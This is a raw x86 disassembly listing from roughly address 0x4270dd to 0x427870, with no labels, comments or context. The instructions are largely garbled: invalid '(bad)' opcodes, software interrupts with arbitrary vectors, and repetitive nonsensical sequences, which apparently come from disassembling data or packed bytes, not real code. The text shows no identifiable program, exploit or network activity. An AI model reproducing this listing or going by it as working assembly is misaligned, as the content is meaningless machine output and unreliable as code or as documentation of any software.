  4270dd:	std    
  4270de:	cmp    ecx,DWORD PTR [edi]
  4270e0:	cmp    ebx,ecx
  4270e2:	shr    ebx,cl
  4270e4:	xchg   edx,eax
  4270e5:	shr    edx,cl
  4270e7:	sub    BYTE PTR [edi],ch
  4270e9:	pop    ecx
  4270ea:	ins    DWORD PTR es:[edi],dx
  4270eb:	push   ebx
  4270ec:	adc    eax,DWORD PTR [ebx-0x2d]
  4270ef:	das    
  4270f0:	add    eax,0x8080928a
  4270f5:	int    0x76
  4270f7:	adc    al,0xcd
  4270f9:	lea    edx,[ecx*8+0x3b80cd89]
  427100:	lock cmp edi,DWORD PTR [ecx-0x2d]
  427104:	repnz sub bl,dl
  427107:	mov    ebp,0xcad35392
  42710c:	je     0x427093
  42710e:	ror    ch,1
  427110:	(bad)  
  427111:	std    
  427112:	int    0x96
  427114:	std    
  427115:	cmp    ecx,DWORD PTR [edi]
  427117:	cmp    ebx,ecx
  427119:	shr    ebx,cl
  42711b:	xchg   edx,eax
  42711c:	shr    edx,cl
  42711e:	sub    BYTE PTR [edi],ch
  427120:	pop    ecx
  427121:	ins    DWORD PTR es:[edi],dx
  427122:	push   ebx
  427123:	adc    eax,DWORD PTR [ebx-0x2d]
  427126:	das    
  427127:	add    eax,0x8080921b
  42712c:	int    0x76
  42712e:	in     eax,dx
  42712f:	int    0x8d
  427131:	in     eax,dx
  427132:	int    0x89
  427134:	int    0x80
  427136:	cmp    esi,eax
  427138:	cmp    edi,DWORD PTR [ecx-0x2d]
  42713b:	repnz sub bl,dl
  42713e:	mov    ebp,0xcad35392
  427143:	je     0x4270ca
  427145:	ror    ch,1
  427147:	(bad)  
  427148:	std    
  427149:	int    0x96
  42714b:	std    
  42714c:	cmp    ecx,DWORD PTR [edi]
  42714e:	cmp    ebx,ecx
  427150:	shr    ebx,cl
  427152:	xchg   edx,eax
  427153:	shr    edx,cl
  427155:	sub    BYTE PTR [edi],ch
  427157:	pop    ecx
  427158:	ins    DWORD PTR es:[edi],dx
  427159:	push   ebx
  42715a:	adc    eax,DWORD PTR [ebx-0x2d]
  42715d:	das    
  42715e:	add    eax,0x808081a5
  427163:	int    0x76
  427165:	adc    ebp,ecx
  427167:	lea    edx,[ecx]
  427169:	int    0x89
  42716b:	int    0x80
  42716d:	cmp    esi,eax
  42716f:	shl    edx,cl
  427171:	sub    BYTE PTR [ebx],bh
  427173:	jns    0x427148
  427175:	mov    ebp,0xcad35392
  42717a:	je     0x427101
  42717c:	ror    ch,1
  42717e:	(bad)  
  42717f:	cmc    
  427180:	int    0x89
  427182:	int    0x96
  427184:	cmc    
  427185:	int    0x22
  427187:	cmp    ecx,DWORD PTR [edi]
  427189:	shr    ebx,cl
  42718b:	xchg   edx,eax
  42718c:	cmp    ebx,ecx
  42718e:	shr    edx,cl
  427190:	sub    BYTE PTR [ebx+0x13],dl
  427193:	retf   0x4d8c
  427196:	rol    BYTE PTR [edx-0x2d],1
  427199:	int    0x8d
  42719b:	adc    al,0xcd
  42719d:	mov    ebp,ecx
  42719f:	xchg   esi,eax
  4271a0:	adc    al,0xcd
  4271a2:	and    bh,BYTE PTR [ebx]
  4271a4:	psrlq  mm5,mm3
  4271a7:	xchg   edx,eax
  4271a8:	cmp    ebx,ecx
  4271aa:	shr    edx,cl
  4271ac:	sub    BYTE PTR [ebx+0x13],dl
  4271af:	retf   0x4d8c
  4271b2:	ror    BYTE PTR [edx-0x2d],1
  4271b5:	int    0x8d
  4271b7:	cmc    
  4271b8:	int    0x89
  4271ba:	int    0x96
  4271bc:	cmc    
  4271bd:	int    0x22
  4271bf:	cmp    ecx,DWORD PTR [edi]
  4271c1:	cmp    ebx,ecx
  4271c3:	shr    ebx,cl
  4271c5:	xchg   edx,eax
  4271c6:	shr    edx,cl
  4271c8:	sub    BYTE PTR [ebx+0x13],dl
  4271cb:	retf   0x4d8c
  4271ce:	push   ebp
  4271cf:	pusha  
  4271d0:	jge    0x427201
  4271d2:	push   es
  4271d3:	mov    esp,0xcd808081
  4271d8:	jbe    0x4271ee
  4271da:	int    0x8d
  4271dc:	adc    al,0xcd
  4271de:	mov    ebp,ecx
  4271e0:	cmp    BYTE PTR [ebx],0xf0
  4271e3:	shl    edx,cl
  4271e5:	sub    BYTE PTR [ebx],bh
  4271e7:	jns    0x4271bc
  4271e9:	mov    ebp,0xcad35392
  4271ee:	je     0x427175
  4271f0:	ror    ch,1
  4271f2:	lea    edx,[ecx]
  4271f4:	int    0x89
  4271f6:	int    0x96
  4271f8:	adc    ebp,ecx
  4271fa:	and    bh,BYTE PTR [ebx]
  4271fc:	psrlq  mm5,mm3
  4271ff:	xchg   edx,eax
  427200:	cmp    ebx,ecx
  427202:	shr    edx,cl
  427204:	sub    BYTE PTR [ebx+0x13],dl
  427207:	retf   0x4d8c
  42720a:	rol    BYTE PTR [edx-0x2d],1
  42720d:	int    0x8d
  42720f:	in     eax,dx
  427210:	int    0x89
  427212:	int    0x96
  427214:	in     eax,dx
  427215:	int    0x22
  427217:	cmp    ecx,DWORD PTR [edi]
  427219:	shr    ebx,cl
  42721b:	xchg   edx,eax
  42721c:	cmp    ebx,ecx
  42721e:	shr    edx,cl
  427220:	sub    BYTE PTR [ebx+0x13],dl
  427223:	retf   0x4d8c
  427226:	ror    BYTE PTR [edx-0x2d],1
  427229:	int    0x8d
  42722b:	adc    ebp,ecx
  42722d:	mov    ebp,ecx
  42722f:	xchg   esi,eax
  427230:	adc    ebp,ecx
  427232:	and    bh,BYTE PTR [ebx]
  427234:	(bad)  
  427236:	(bad)  
  427238:	jmp    0x4271cc
  42723a:	shr    edx,cl
  42723c:	sub    BYTE PTR [ebx+0x13],dl
  42723f:	retf   0x4d8c
  427242:	push   ebp
  427243:	pusha  
  427244:	jge    0x427275
  427246:	push   es
  427247:	cmc    
  427248:	add    BYTE PTR [eax-0x12893280],0xcd
  42724f:	(bad)  
  427250:	in     eax,dx
  427251:	int    0x89
  427253:	int    0x80
  427255:	cmp    esi,eax
  427257:	shl    edx,cl
  427259:	sub    BYTE PTR [ebx],bh
  42725b:	jns    0x427230
  42725d:	mov    ebp,0xcad35392
  427262:	je     0x4271e9
  427264:	ror    ch,1
  427266:	lea    edx,[ecx*8+0x1496cd89]
  42726d:	int    0x22
  42726f:	cmp    ecx,DWORD PTR [edi]
  427271:	shr    ebx,cl
  427273:	xchg   edx,eax
  427274:	cmp    ebx,ecx
  427276:	shr    edx,cl
  427278:	sub    BYTE PTR [ebx+0x13],dl
  42727b:	retf   0x4d8c
  42727e:	rol    BYTE PTR [edx-0x2d],1
  427281:	int    0x8d
  427283:	cmc    
  427284:	int    0x89
  427286:	int    0x96
  427288:	cmc    
  427289:	int    0x22
  42728b:	cmp    ecx,DWORD PTR [edi]
  42728d:	shr    ebx,cl
  42728f:	xchg   edx,eax
  427290:	cmp    ebx,ecx
  427292:	shr    edx,cl
  427294:	sub    BYTE PTR [ebx+0x13],dl
  427297:	retf   0x4d8c
  42729a:	ror    BYTE PTR [edx-0x2d],1
  42729d:	int    0x8d
  42729f:	adc    al,0xcd
  4272a1:	mov    ebp,ecx
  4272a3:	xchg   esi,eax
  4272a4:	adc    al,0xcd
  4272a6:	and    bh,BYTE PTR [ebx]
  4272a8:	(bad)  
  4272aa:	(bad)  
  4272ac:	jmp    0x427240
  4272ae:	shr    edx,cl
  4272b0:	sub    BYTE PTR [ebx+0x13],dl
  4272b3:	retf   0x4d8c
  4272b6:	push   ebp
  4272b7:	pusha  
  4272b8:	jge    0x4272e9
  4272ba:	push   es
  4272bb:	add    DWORD PTR [eax+0x76cd8080],eax
  4272c1:	in     eax,dx
  4272c2:	int    0x8d
  4272c4:	in     eax,dx
  4272c5:	int    0x89
  4272c7:	int    0x80
  4272c9:	cmp    esi,eax
  4272cb:	shl    edx,cl
  4272cd:	sub    BYTE PTR [ebx],bh
  4272cf:	jns    0x4272a4
  4272d1:	mov    ebp,0xcad35392
  4272d6:	je     0x42725d
  4272d8:	ror    ch,1
  4272da:	(bad)  
  4272db:	cmc    
  4272dc:	int    0x89
  4272de:	int    0x96
  4272e0:	cmc    
  4272e1:	int    0x22
  4272e3:	cmp    ecx,DWORD PTR [edi]
  4272e5:	shr    ebx,cl
  4272e7:	xchg   edx,eax
  4272e8:	cmp    ebx,ecx
  4272ea:	shr    edx,cl
  4272ec:	sub    BYTE PTR [ebx+0x13],dl
  4272ef:	retf   0x4d8c
  4272f2:	rol    BYTE PTR [edx-0x2d],1
  4272f5:	int    0x8d
  4272f7:	adc    ebp,ecx
  4272f9:	mov    ebp,ecx
  4272fb:	xchg   esi,eax
  4272fc:	adc    ebp,ecx
  4272fe:	and    bh,BYTE PTR [ebx]
  427300:	psrlq  mm5,mm3
  427303:	xchg   edx,eax
  427304:	cmp    ebx,ecx
  427306:	shr    edx,cl
  427308:	sub    BYTE PTR [ebx+0x13],dl
  42730b:	retf   0x4d8c
  42730e:	ror    BYTE PTR [edx-0x2d],1
  427311:	int    0x8d
  427313:	in     eax,dx
  427314:	int    0x89
  427316:	int    0x96
  427318:	in     eax,dx
  427319:	int    0x22
  42731b:	cmp    ecx,DWORD PTR [edi]
  42731d:	cmp    ebx,ecx
  42731f:	shr    ebx,cl
  427321:	xchg   edx,eax
  427322:	shr    edx,cl
  427324:	sub    BYTE PTR [ebx+0x13],dl
  427327:	retf   0x4d8c
  42732a:	push   ebp
  42732b:	pusha  
  42732c:	jge    0x427304
  42732e:	xor    bh,cl
  427330:	jbe    0x427302
  427332:	jo     0x4272f1
  427334:	outs   dx,DWORD PTR ds:[esi]
  427335:	lods   eax,DWORD PTR ds:[esi]
  427336:	add    BYTE PTR [eax],al
  427338:	int    0x8d
  42733a:	pop    ebp
  42733b:	inc    ebx
  42733c:	rcl    esp,cl
  42733e:	push   ss
  42733f:	int    0x76
  427341:	std    
  427342:	int    0x8d
  427344:	std    
  427345:	cmp    esi,eax
  427347:	cmp    edi,DWORD PTR [ecx-0x2d]
  42734a:	repnz sub bl,dl
  42734d:	mov    ebp,0xad35392
  427352:	jbe    0x427301
  427354:	int    0x76
  427356:	stc    
  427357:	int    0xa6
  427359:	stc    
  42735a:	int    0x76
  42735c:	stc    
  42735d:	int    0x8d
  42735f:	stc    
  427360:	cmp    ebp,DWORD PTR [ecx-0x132c36c5]
  427366:	xchg   edx,eax
  427367:	shr    DWORD PTR [ebp-0x7862acd8],cl
  42736d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42736e:	gs int 0x76
  427371:	xchg   ebp,eax
  427372:	cmp    ecx,DWORD PTR [edi]
  427374:	add    al,0xf2
  427376:	std    
  427377:	add    al,0xad
  427379:	std    
  42737a:	shr    esp,cl
  42737c:	sub    BYTE PTR [edi+0x12db537d],al
  427382:	hlt    
  427383:	dec    ecx
  427384:	and    DWORD PTR [esi-0x28932cb],eax
  42738a:	int    0x8d
  42738c:	std    
  42738d:	cmp    esi,eax
  42738f:	cmp    edi,DWORD PTR [ecx-0x2d]
  427392:	repnz sub bl,dl
  427395:	mov    ebp,0xcdd35392
  42739a:	lea    ebp,[ebp+0x52f7d43]
  4273a0:	push   ds
  4273a1:	std    
  4273a2:	add    BYTE PTR [eax],al
  4273a4:	int    0x76
  4273a6:	std    
  4273a7:	int    0x8d
  4273a9:	std    
  4273aa:	cmp    edi,DWORD PTR [ecx+0x3b]
  4273ad:	lock shl edx,cl
  4273b0:	sub    bl,dl
  4273b2:	mov    ebp,0xcdd35392
  4273b7:	lea    ebp,[ebp+0x1ad67d43]
  4273bd:	int    0x76
  4273bf:	stc    
  4273c0:	int    0x8d
  4273c2:	stc    
  4273c3:	cmp    edi,DWORD PTR [ecx+0x3b]
  4273c6:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4273cd:	push   ebx
  4273ce:	shr    ebx,cl
  4273d0:	jle    0x427353
  4273d2:	add    BYTE PTR [eax+0x5b6324c0],0x0
  4273d9:	(bad)  
  4273da:	popf   
  4273db:	iret   
  4273dc:	jbe    0x4273f3
  4273de:	jo     0x42739d
  4273e0:	jge    0x4273bd
  4273e2:	add    BYTE PTR [eax],al
  4273e4:	int    0x76
  4273e6:	std    
  4273e7:	int    0x8d
  4273e9:	std    
  4273ea:	cmp    edi,DWORD PTR [ecx+0x3b]
  4273ed:	lock shl edx,cl
  4273f0:	sub    bl,dl
  4273f2:	mov    ebp,0xcdd35392
  4273f7:	lea    esp,[ebp+0x5bd4d343]
  4273fd:	int    0x76
  4273ff:	stc    
  427400:	int    0x8d
  427402:	stc    
  427403:	cmp    edi,DWORD PTR [ecx+0x3b]
  427406:	lock shl edx,cl
  427409:	sub    bl,dl
  42740b:	mov    ebp,0xcdd35392
  427410:	lea    esp,[ebp+0x26d4d343]
  427416:	int    0x76
  427418:	stc    
  427419:	int    0x8d
  42741b:	stc    
  42741c:	cmp    edi,DWORD PTR [ecx+0x3b]
  42741f:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427426:	push   ebx
  427427:	shl    DWORD PTR [eax+0x5b],cl
  42742a:	iret   
  42742b:	jbe    0x427442
  42742d:	jo     0x4273ec
  42742f:	das    
  427430:	cli    
  427431:	add    BYTE PTR [eax],al
  427433:	int    0x76
  427435:	std    
  427436:	int    0x8d
  427438:	std    
  427439:	cmp    edi,DWORD PTR [ecx+0x3b]
  42743c:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427443:	push   ebx
  427444:	shl    DWORD PTR [eax+0x5b],cl
  427447:	iret   
  427448:	jbe    0x42745f
  42744a:	jo     0x427409
  42744c:	sti    
  42744d:	stc    
  42744e:	add    BYTE PTR [eax],al
  427450:	int    0x76
  427452:	popf   
  427453:	xchg   ebp,eax
  427455:	or     dh,BYTE PTR [esi+0x14]
  427458:	add    dh,dl
  42745a:	cmp    eax,0xcd14d600
  42745f:	jbe    0x427496
  427461:	xchg   DWORD PTR [esi-0x78],esi
  427464:	jo     0x427423
  427466:	push   edx
  427467:	fild   DWORD PTR [eax]
  427469:	add    ch,cl
  42746b:	jbe    0x42746a
  42746d:	int    0x8d
  42746f:	std    
  427470:	cmp    edi,DWORD PTR [ecx+0x3b]
  427473:	lock shl edx,cl
  427476:	sub    bl,dl
  427478:	mov    ebp,0xcdd35392
  42747d:	lea    esp,[ebp-0x592b2cbd]
  427483:	int    0x76
  427485:	stc    
  427486:	int    0x8d
  427488:	stc    
  427489:	cmp    edi,DWORD PTR [ecx+0x3b]
  42748c:	lock shl edx,cl
  42748f:	sub    bl,dl
  427491:	mov    ebp,0xcdd35392
  427496:	lea    esp,[ebp+0x32d4d343]
  42749c:	int    0x76
  42749e:	stc    
  42749f:	int    0x8d
  4274a1:	stc    
  4274a2:	cmp    edi,DWORD PTR [ecx-0x2d]
  4274a5:	mov    ebp,0xd3f03b92
  4274aa:	repnz sub BYTE PTR [ebx-0x2d],dl
  4274ae:	jo     0x4274b0
  4274b0:	(bad)  
  4274b1:	cmp    eax,0x873576cd
  4274b6:	jbe    0x427440
  4274b8:	jo     0x427477
  4274ba:	add    eax,0xcd0000f9
  4274bf:	jbe    0x4274be
  4274c1:	int    0x8d
  4274c3:	std    
  4274c4:	cmp    edi,DWORD PTR [ecx-0x2d]
  4274c7:	mov    ebp,0xd3f03b92
  4274cc:	repnz sub BYTE PTR [ebx-0x2d],dl
  4274d0:	jo     0x4274d2
  4274d2:	(bad)  
  4274d3:	cmp    eax,0x873576cd
  4274d8:	jbe    0x427462
  4274da:	jo     0x427499
  4274dc:	jb     0x4274d7
  4274de:	add    BYTE PTR [eax],al
  4274e0:	int    0x8d
  4274e2:	inc    ebp
  4274e3:	int    0x76
  4274e5:	inc    ebp
  4274e6:	cmp    ecx,ecx
  4274e8:	cmp    ecx,DWORD PTR [edi]
  4274ea:	shr    ebx,cl
  4274ec:	xchg   edx,eax
  4274ed:	shr    DWORD PTR [ebp-0x322cacd8],cl
  4274f3:	lea    ebp,ds:0x803fd33b
  4274f9:	add    DWORD PTR [eax+0x3614d480],0x80800180
  427503:	jo     0x427505
  427505:	(bad)  
  427506:	cmp    eax,0x87358dcd
  42750b:	lea    ecx,[eax+0xa95abd]
  427511:	add    ch,cl
  427513:	jbe    0x427545
  427515:	int    0x8d
  427517:	cmp    eax,0x76cd8881
  42751c:	cmp    eax,0xabd7687
  427521:	jbe    0x4274e0
  427523:	int    0x76
  427525:	stc    
  427526:	int    0x8d
  427528:	stc    
  427529:	cmp    esi,eax
  42752b:	shl    edx,cl
  42752d:	sub    BYTE PTR [ebx],bh
  42752f:	jns    0x427504
  427531:	mov    ebp,0xcdd35392
  427536:	lea    edi,[ebp-0x322c2ed1]
  42753c:	(bad)  
  42753d:	std    
  42753e:	int    0x96
  427540:	std    
  427541:	cmp    ecx,DWORD PTR [edi]
  427543:	cmp    ebx,ecx
  427545:	shr    ebx,cl
  427547:	xchg   edx,eax
  427548:	shr    edx,cl
  42754a:	sub    BYTE PTR [ebx+0x13],dl
  42754d:	xchg   DWORD PTR [ebp+0x2fd343f1],ecx
  427553:	or     edi,DWORD PTR [ecx]
  427555:	cli    
  427556:	add    BYTE PTR [eax],al
  427558:	int    0x76
  42755a:	mov    BYTE PTR [edx-0x2d349c58],ch
  427560:	xor    BYTE PTR [eax+0x4edcd96],al
  427566:	in     eax,dx
  427567:	adc    al,0x5b
  427569:	cwde   
  42756a:	call   0xcd34:0x76cd6d3b
  427571:	add    DWORD PTR ds:0xcd808081,ebp
  427577:	xchg   esi,eax
  427578:	mov    ch,cl
  42757a:	or     ch,0xd6
  42757d:	dec    esp
  42757e:	int    0xe6
  427580:	mov    ch,cl
  427582:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427583:	dec    esp
  427584:	or     dh,BYTE PTR [esi-0x3]
  427587:	pop    edi
  427588:	jnp    0x4275c1
  42758a:	ficom  WORD PTR [ebx]
  42758c:	cmp    esp,ebx
  42758e:	pop    ebp
  42758f:	mov    ebp,0x3b25230a
  427594:	adc    DWORD PTR [edi],ebp
  427596:	inc    ebp
  427597:	sti    
  427598:	xchg   edx,eax
  427599:	shr    ecx,cl
  42759b:	sub    BYTE PTR [edx],dl
  42759d:	clc    
  42759e:	add    BYTE PTR [eax-0x102c9380],0x92
  4275a5:	cmp    ebx,ebp
  4275a7:	push   ebx
  4275a8:	clc    
  4275a9:	int    0xe6
  4275ab:	sbb    al,0x53
  4275ad:	aad    0x43
  4275af:	(bad)  
  4275b1:	sbb    eax,DWORD PTR [ebx-0xc]
  4275b4:	(bad)  
  4275b5:	das    
  4275b6:	adc    cl,BYTE PTR [ebp+0x59]
  4275b9:	je     0x427565
  4275bb:	push   edi
  4275bc:	ja     0x427583
  4275be:	xchg   edi,eax
  4275bf:	shr    ebx,0xd9
  4275c2:	add    DWORD PTR [eax+0x3096cd80],0xcd14d6cd
  4275cc:	xchg   esi,eax
  4275cd:	mov    ch,cl
  4275cf:	(bad)  
  4275d0:	dec    esp
  4275d1:	int    0x96
  4275d3:	mov    ch,cl
  4275d5:	(bad)  
  4275d6:	dec    esp
  4275d7:	int    0xe6
  4275d9:	mov    ch,cl
  4275db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275dc:	dec    esp
  4275dd:	cmp    edx,DWORD PTR [ecx]
  4275df:	cmp    esp,ebx
  4275e1:	das    
  4275e2:	inc    ebp
  4275e3:	sti    
  4275e4:	xchg   edx,eax
  4275e5:	shr    ecx,cl
  4275e7:	sub    BYTE PTR [edx],dl
  4275e9:	clc    
  4275ea:	add    BYTE PTR [eax-0x22c49380],0x53
  4275f1:	aad    0xd3
  4275f3:	out    dx,eax
  4275f4:	xchg   edx,eax
  4275f5:	push   ebx
  4275f6:	clc    
  4275f7:	int    0xe6
  4275f9:	xor    ch,cl
  4275fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275fc:	adc    al,0x3b
  4275fe:	popf   
  4275ff:	int    0x76
  427601:	xor    BYTE PTR [ebx],bh
  427603:	cli    
  427604:	int    0x8d
  427606:	adc    al,0x2f
  427608:	inc    ebp
  427609:	loope  0x42759d
  42760b:	shr    DWORD PTR [ebp+0x53cb3b28],cl
  427611:	cli    
  427612:	push   esi
  427613:	add    BYTE PTR [eax-0x132c9380],0x92
  42761a:	push   ebx
  42761b:	popf   
  42761c:	int    0x76
  42761e:	mov    BYTE PTR [edi-0x320be427],al
  427624:	bswap  ebp
  427626:	(bad)  
  427627:	dec    esp
  427628:	int    0xe6
  42762a:	xor    ch,cl
  42762c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42762d:	adc    al,0x4
  42762f:	lods   eax,DWORD PTR ds:[esi]
  427630:	std    
  427631:	add    al,0xe9
  427633:	std    
  427634:	shr    ebx,cl
  427636:	sub    BYTE PTR [ebx],bh
  427638:	ficom  DWORD PTR [esi-0x2c]
  42763b:	aaa    
  42763c:	ficom  WORD PTR [ebx]
  42763e:	adc    dh,bh
  427640:	mov    ebp,0x1225230a
  427645:	clc    
  427646:	aam    0x37
  427648:	ficom  WORD PTR [ebx]
  42764a:	adc    dh,ah
  42764c:	mov    ebp,0x8725230a
  427651:	leave  
  427652:	sbb    esi,esp
  427654:	push   ebx
  427655:	jge    0x4276aa
  427657:	cdq    
  427658:	pop    ebp
  427659:	mov    ebp,0x1225230a
  42765e:	add    dl,dh
  427660:	aaa    
  427661:	ficom  WORD PTR [ebx]
  427663:	cmp    esi,ecx
  427665:	adc    bh,dl
  427667:	out    0x37,al
  427669:	ficom  WORD PTR [ebx]
  42766b:	(bad)  
  42766c:	sbb    eax,DWORD PTR [ebx-0xf]
  42766f:	(bad)  
  427670:	das    
  427671:	adc    dl,BYTE PTR [esi-0x1]
  427674:	das    
  427675:	stos   DWORD PTR es:[edi],eax
  427676:	push   es
  427677:	in     eax,0x9b
  427679:	xchg   edi,eax
  42767a:	imul   bl
  42767c:	and    al,0x81
  42767e:	add    BYTE PTR [eax-0x32776933],0xd6
  427685:	dec    esp
  427686:	int    0xa6
  427688:	mov    ch,cl
  42768a:	out    0x4c,al
  42768c:	cmp    edx,DWORD PTR [ecx]
  42768e:	pop    edi
  42768f:	jnp    0x4276c8
  427691:	ficom  WORD PTR [ebx]
  427693:	cmp    esp,ebx
  427695:	das    
  427696:	inc    ebp
  427697:	sti    
  427698:	xchg   edx,eax
  427699:	shr    edi,cl
  42769b:	xchg   edx,eax
  42769c:	cmp    eax,DWORD PTR [eax]
  42769e:	shl    ebp,cl
  4276a0:	sub    BYTE PTR [edx],cl
  4276a2:	(bad)  
  4276a3:	cmc    
  4276a4:	push   ebx
  4276a5:	fxch   st(5)
  4276a7:	out    0xf5,al
  4276a9:	imul   eax,DWORD PTR [eax+0x3b6c8080],0xcdfc53a9
  4276b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4276b4:	and    al,0xcd
  4276b6:	and    ecx,DWORD PTR [edx]
  4276b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4276b9:	adc    DWORD PTR [ebx-0x1e],eax
  4276bc:	(bad)  
  4276bd:	xchg   BYTE PTR [ebx],bh
  4276bf:	fiadd  DWORD PTR [ebx-0x27]
  4276c2:	aam    0x20
  4276c4:	add    dh,dl
  4276c6:	xor    al,0xcd
  4276c8:	(bad)  
  4276c9:	and    al,0x0
  4276cb:	(bad)  
  4276cc:	sub    al,0x0
  4276ce:	(bad)  
  4276cf:	std    
  4276d0:	add    BYTE PTR [eax-0x43],bl
  4276d3:	sub    edi,eax
  4276d5:	add    BYTE PTR [eax],al
  4276d7:	or     al,BYTE PTR [esi-0x7f7f9615]
  4276dd:	or     ch,0x96
  4276e0:	mov    ch,cl
  4276e2:	out    0x4c,al
  4276e4:	cmp    edi,ecx
  4276e6:	cmp    esp,ebx
  4276e8:	das    
  4276e9:	inc    ebp
  4276ea:	add    edx,DWORD PTR [edx+0xa9210d3]
  4276f0:	out    0xf5,al
  4276f2:	int    0xe6
  4276f4:	mov    ch,cl
  4276f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4276f7:	dec    esp
  4276f8:	shr    ecx,cl
  4276fa:	sub    BYTE PTR [ebx],bh
  4276fc:	dec    ebp
  4276fe:	(bad)  
  4276ff:	cmc    
  427700:	cmp    ebx,ebp
  427702:	push   ebx
  427703:	clc    
  427704:	int    0xe6
  427706:	xor    BYTE PTR [ebx],bh
  427708:	cli    
  427709:	push   ebx
  42770a:	aad    0xcd
  42770c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42770d:	adc    al,0x3b
  42770f:	popf   
  427710:	int    0xc9
  427712:	int    0xe6
  427714:	xor    ch,cl
  427716:	or     al,0xcd
  427718:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427719:	adc    al,0x2f
  42771b:	inc    ebp
  42771c:	jge    0x4276b0
  42771e:	shr    ecx,cl
  427720:	sub    BYTE PTR [ebx],bh
  427722:	fst    st(3)
  427724:	jmp    0x4276b8
  427726:	adc    bh,al
  427728:	add    BYTE PTR [eax-0x3aac9380],0x53
  42772f:	lock inc ebx
  427731:	icebp  
  427732:	(bad)  
  427733:	sbb    BYTE PTR [ebx+0x2],al
  427736:	(bad)  
  427737:	and    dh,BYTE PTR [ecx+0x761dfc3b]
  42773d:	mov    esi,0xdd8bf56d
  427742:	(bad)  
  427743:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427744:	cmp    edi,esp
  427746:	sbb    eax,0xcd62ec76
  42774b:	jbe    0x4276d5
  42774d:	int    0x8d
  42774f:	dec    esp
  427750:	int    0x96
  427752:	mov    ch,cl
  427754:	(bad)  
  427755:	dec    esp
  427756:	adc    al,BYTE PTR [edx]
  427758:	mov    ebp,0x5625230a
  42775d:	jnp    0x427796
  42775f:	ficom  WORD PTR [ebx]
  427761:	das    
  427762:	inc    ebp
  427763:	jge    0x4276f7
  427765:	int    0xfb
  427767:	cmp    eax,DWORD PTR [eax]
  427769:	cmp    ebx,edx
  42776b:	sar    DWORD PTR [ecx-0x2cfcc4d8],cl
  427771:	jmp    0x427705
  427773:	adc    dh,bh
  427775:	add    BYTE PTR [eax-0x36ac9380],0x53
  42777c:	divps  xmm6,XMMWORD PTR [esi-0x3]
  427780:	(bad)  
  427781:	test   BYTE PTR [ebx-0x1d],al
  427784:	aam    0x4c
  427786:	adc    al,BYTE PTR [esi-0x3e]
  427789:	gs sub al,0x1
  42778c:	jo     0x4277c8
  42778e:	mov    edx,0x124aece0
  427793:	ss inc edx
  427795:	das    
  427796:	sbb    edx,esi
  427798:	mov    ebx,0xaa029f75
  42779d:	test   al,0x63
  42779f:	retf   
  4277a0:	shr    BYTE PTR [eax+eax*4],cl
  4277a3:	xchg   esi,eax
  4277a4:	int    0xed
  4277a6:	add    al,0xed
  4277a8:	dec    esp
  4277a9:	int    0x76
  4277ab:	mov    ch,cl
  4277ad:	lea    ecx,[edi+ebp*1+0x45]
  4277b1:	jge    0x427745
  4277b3:	shr    ebx,cl
  4277b5:	xchg   edx,eax
  4277b6:	int    0x8d
  4277b8:	mov    ch,cl
  4277ba:	xchg   esi,eax
  4277bb:	dec    esp
  4277bc:	cwde   
  4277bd:	shl    edx,cl
  4277bf:	sub    ch,cl
  4277c1:	lea    ebx,[ecx+ebp*2]
  4277c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4277c5:	mov    esi,0x793b4229
  4277ca:	cmp    ebx,edx
  4277cc:	push   ebx
  4277cd:	ror    BYTE PTR [edx],cl
  4277cf:	or     ebp,0x1cd2476
  4277d5:	xor    eax,0xcd808081
  4277da:	mov    ch,cl
  4277dc:	jbe    0x427802
  4277de:	int    0x1
  4277e0:	xor    eax,0xcd808081
  4277e5:	add    BYTE PTR [edi-0x72329b92],0x24
  4277ec:	int    0xa
  4277ee:	adc    DWORD PTR [ecx+0x7ecd8080],eax
  4277f4:	adc    al,0xc0
  4277f6:	test   BYTE PTR [eax+eax*4+0x808050],bh
  4277fd:	nop
  4277fe:	jo     0x427862
  427800:	add    bl,ah
  427802:	or     cl,BYTE PTR [ebx-0x32778933]
  427808:	lea    ecx,[edi+ebp*1+0x45]
  42780c:	jge    0x4277a0
  42780e:	shr    ebx,cl
  427810:	xchg   edx,eax
  427811:	int    0x8d
  427813:	mov    ch,cl
  427815:	xchg   esi,eax
  427816:	dec    esp
  427817:	add    dh,dl
  427819:	and    al,0x3b
  42781b:	jns    0x427858
  42781d:	ficom  DWORD PTR [ebx-0x2e]
  427820:	or     dh,BYTE PTR [esi-0x3]
  427823:	iret   
  427824:	jbe    0x427823
  427826:	jo     0x4277c2
  427828:	add    dh,dl
  42782a:	sbb    al,0xd3
  42782c:	repnz sub BYTE PTR [eax],al
  42782f:	(bad)  
  427830:	adc    al,0x0
  427832:	(bad)  
  427833:	xor    BYTE PTR [eax],al
  427835:	(bad)  
  427836:	dec    esp
  427837:	add    dh,dl
  427839:	mov    BYTE PTR [ebp+0xfe2b],bh
  42783f:	int    0x76
  427841:	mov    ch,cl
  427843:	lea    ecx,[edi+ebp*1+0x45]
  427847:	jge    0x4277db
  427849:	shr    ebx,cl
  42784b:	xchg   edx,eax
  42784c:	int    0x8d
  42784e:	mov    ch,cl
  427850:	xchg   esi,eax
  427851:	dec    esp
  427852:	cmp    edi,DWORD PTR [ecx+0x3b]
  427855:	fcmovbe st,st(3)
  427857:	repnz sub ch,cl
  42785a:	das    
  42785b:	push   ebx
  42785c:	rol    BYTE PTR [ebx+0x7d],cl
  42785f:	aam    0x36
  427861:	int    0x76
  427863:	xor    ch,cl
  427865:	lea    edx,[edi+ebp*1]
  427868:	inc    ebp
  427869:	jge    0x4277fd
  42786b:	shr    ebx,cl
  42786d:	xchg   edx,eax
  42786e:	int    0x8d
  427870:	xor    ch,cl
